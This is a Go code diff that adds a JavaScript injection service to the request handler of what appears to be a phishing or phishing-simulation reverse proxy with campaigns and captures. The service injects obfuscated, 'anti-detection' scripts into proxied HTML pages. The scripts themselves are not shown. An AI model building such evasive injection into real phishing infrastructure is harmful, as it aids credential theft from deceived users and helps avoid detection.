@@ -128,6 +128,7 @@ type ProxyHandler struct {
 	ProxyCaptureRepository      *repository.ProxyCapture
 	LiveMapService              *service.LiveMap
 	OpenGraphConfigRepository   *repository.OpenGraphConfig
+	JsInjectionService          *service.JsInjection
 	ogConfigCache               sync.Map // cache of proxy ID -> *database.OpenGraphConfig
 	cookieName                  string
 }
@@ -151,6 +152,7 @@ func NewProxyHandler(
 	proxyCaptureRepo *repository.ProxyCapture,
 	liveMapService *service.LiveMap,
 	ogConfigRepo *repository.OpenGraphConfig,
+	jsInjectionService *service.JsInjection,
 ) *ProxyHandler {
 	// get proxy cookie name from database
 	cookieName := "ps" // fallback default
@@ -177,6 +179,7 @@ func NewProxyHandler(
 		ProxyCaptureRepository:      proxyCaptureRepo,
 		LiveMapService:              liveMapService,
 		OpenGraphConfigRepository:   ogConfigRepo,
+		JsInjectionService:          jsInjectionService,
 		cookieName:                  cookieName,
 	}
 
@@ -1170,6 +1173,19 @@ func (m *ProxyHandler) rewriteResponseBodyWithContext(resp *http.Response, reqCt
 	varCtx := m.buildVariablesContext(resp.Request.Context(), reqCtx.Session, reqCtx.ProxyConfig)
 	body = m.applyCustomReplacementsWithVariables(body, reqCtx.Session, reqCtx.TargetDomain, reqCtx.ProxyConfig, varCtx, contentType)
 
+	// apply JS injection rules (built-in anti-detection + user-defined)
+	if m.JsInjectionService != nil && strings.Contains(contentType, "text/html") {
+		targetHost := reqCtx.TargetDomain
+		reqPath := ""
+		if resp.Request != nil && resp.Request.URL != nil {
+			reqPath = resp.Request.URL.Path
+		}
+		if combinedScript := m.JsInjectionService.GetAllMatchingScripts(targetHost, reqPath); combinedScript != "" {
+			obfuscatedJS := m.JsInjectionService.ObfuscateScript(combinedScript)
+			body = m.JsInjectionService.InjectJavascriptIntoBody(body, obfuscatedJS, "")
+		}
+	}
+
 	// apply obfuscation if enabled
 	if reqCtx.Campaign != nil && strings.Contains(contentType, "text/html") {
 		if obfuscate, err := reqCtx.Campaign.Obfuscate.Get(); err == nil && obfuscate {
@@ -1348,6 +1364,19 @@ func (m *ProxyHandler) rewriteResponseBodyWithoutSessionContext(resp *http.Respo
 	}
 
 	body = m.applyCustomReplacementsWithoutSession(body, configMap, reqCtx.TargetDomain, reqCtx.ProxyConfig, contentType)
+
+	// apply JS injection rules (built-in anti-detection + user-defined)
+	if m.JsInjectionService != nil && strings.Contains(contentType, "text/html") {
+		targetHost := reqCtx.TargetDomain
+		reqPath := ""
+		if resp.Request != nil && resp.Request.URL != nil {
+			reqPath = resp.Request.URL.Path
+		}
+		if combinedScript := m.JsInjectionService.GetAllMatchingScripts(targetHost, reqPath); combinedScript != "" {
+			obfuscatedJS := m.JsInjectionService.ObfuscateScript(combinedScript)
+			body = m.JsInjectionService.InjectJavascriptIntoBody(body, obfuscatedJS, "")
+		}
+	}
 
 	// apply obfuscation if enabled
 	if reqCtx.Campaign != nil && strings.Contains(contentType, "text/html") {
